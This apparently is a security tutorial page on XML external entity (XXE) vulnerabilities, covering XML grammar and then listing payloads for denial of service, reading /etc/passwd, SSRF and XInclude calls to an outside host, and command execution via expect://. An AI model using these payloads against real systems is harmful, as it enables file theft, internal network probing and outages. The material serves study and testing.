XXE
======================================

XML basics
--------------------------------------
XML refers to eXtensible Markup Language, which is a markup language used to mark electronic documents to make them structural. It is designed to transmit and store data. The XML document structure includes XML declaration, DTD document type definition (optional), and document elements. Currently, XML files are widely used as configuration files (Spring, Struts2, etc.), document structure description files (PDF, RSS, etc.), and image format files (SVG header). The syntax specification of XML is controlled by DTD (Document Type Definition).

basic grammar
--------------------------------------
The XML document has a structure of ``<?xml version="1.0" encoding="UTF-8" standalone="yes"?>`` at the beginning. This structure is called XML prolog. It is used to declare the version and encoding of the XML document. It is optional, but must be placed at the beginning of the document.

In addition to the optional prefix, XML syntax mainly has the following features:

- All XML elements must have a closing tag
- XML ​​tags are case sensitive
- XML ​​must be nested correctly
- The XML document must have a root element
- XML ​​attribute values ​​need to be quoted

In addition, XML also has CDATA syntax, which is used to handle situations where multiple characters need to be escaped.

XXE
--------------------------------------
When external entities are allowed to be referenced, malicious XML content can be constructed to lead to reading arbitrary files, executing system commands, detecting intranet ports, and attacking intranet websites. General XXE attacks can only use XXE vulnerabilities to read server-side files when the server has an echo or error report, but the attack can also be implemented through Blind XXE.

Attack method
--------------------------------------

denial of service attack
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::

    <!DOCTYPE data [
    <!ELEMENT data (#ANY)>
    <!ENTITY a0 "dos" >
    <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;">
    <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;">
    ]>
    <data>&a2;</data>

If the parsing process is very slow, the test is successful and the target site may have a denial of service vulnerability.
Specific attacks can use more layers of iteration or recursion, and can also reference huge external entities to achieve the effect of the attack.


file reading
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::

    <?xml version="1.0"?>
    <!DOCTYPE data [
    <!ELEMENT data (#ANY)>
    <!ENTITY file SYSTEM "file:///etc/passwd">
    ]>
    <data>&file;</data>

SSRF
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::

    <?xml version="1.0"?>
    <!DOCTYPE data SYSTEM "http://publicServer.com/" [
    <!ELEMENT data (#ANY)>
    ]>
    <data>4</data>

RCE
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::

    <?xml version="1.0"?>
    <!DOCTYPE GVI [ <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "expect://id" >]>
    <catalog>
       <core id="test101">
          <description>&xxe;</description>
       </core>
    </catalog>

XInclude
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::

    <?xml version='1.0'?>
    <data xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://publicServer.com/file.xml"></xi:include></data>

Reference link
--------------------------------------
- `XML Tutorial <http://www.w3school.com.cn/xml/>`_
- `How to defend against unknown attacks? XXE vulnerability attack and defense <https://security.tencent.com/index.php/blog/msg/69>`_
- `XXE attack note sharing <http://www.freebuf.com/articles/web/97833.html>`_
- `From XML related step by step to XXE vulnerability <https://xz.aliyun.com/t/6887>`_
